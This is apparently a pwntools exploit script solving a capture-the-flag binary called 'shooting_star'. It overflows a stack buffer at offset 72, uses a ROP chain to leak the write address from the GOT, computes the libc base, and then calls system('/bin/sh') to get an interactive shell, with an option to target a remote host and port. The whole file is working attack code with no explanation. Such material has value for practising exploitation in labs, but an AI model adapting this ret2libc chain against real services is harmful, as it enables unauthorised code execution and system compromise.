#!/usr/bin/python3

from pwn import *
import json

elf = None

def start():
    global elf
    file_name = './shooting_star'
    elf = context.binary = ELF(file_name)
    if len(sys.argv) > 1:
        if sys.argv[1] ==  'gdb':
            gdbscript = '''
            pwndbg-init
            break main
            continue
            '''
            return gdb.debug(file_name, gdbscript=gdbscript)
        elif sys.argv[1] == 'remote':
            host, port = sys.argv[2:]
            return remote(host, int(port))

    return process(file_name)


def send_payload():

    # payload = b'a' * 72
    pop_rdi = p64(0x4012cb)
    pop_rsi = p64(0x4012c9)
    offset = 72
    payload = flat(
        {
            offset: [
                pop_rsi,
                elf.got.write,
                0x0,
                elf.plt.write,
                elf.symbols.main
            ]
        }
    )

    return payload

def runmain():

    io = start()
    io.sendlineafter('>', b'1')
    io.sendlineafter('>>', send_payload())
    io.recvuntil(b'May your wish come true!\n')
    data = io.recv()
    leaked_address = unpack(data[:6].ljust(8, b'\x00'))
    info(f'The leaked address: -----| {hex(leaked_address)} |-----')
    info(f'The data is: \n-----\n{data}\n-----\n')
    
    write_offset = 0x110210
    libc_base = leaked_address - write_offset

    system_addr = libc_base + 0x04f550

    info(f'leaked system addr: {hex(system_addr)}')

    bin_sh_system_diff = 1315586 # bin_sh - system = k
    bin_sh = bin_sh_system_diff + system_addr
    bin_sh = libc_base + 0x1b3e1a

    info(f'leaked "/bin/sh" addr: {hex(bin_sh)}')

    offset = 72
    pop_rdi = p64(0x4012cb)

    payload = flat(
        {
            offset: [
                pop_rdi,
                bin_sh,
                system_addr
            ]
        }
    )
    io.send(b'1')
    # io.sendlineafter('>', b'1')
    io.sendlineafter('>', payload)

    io.interactive()


if __name__ == "__main__":
    runmain()
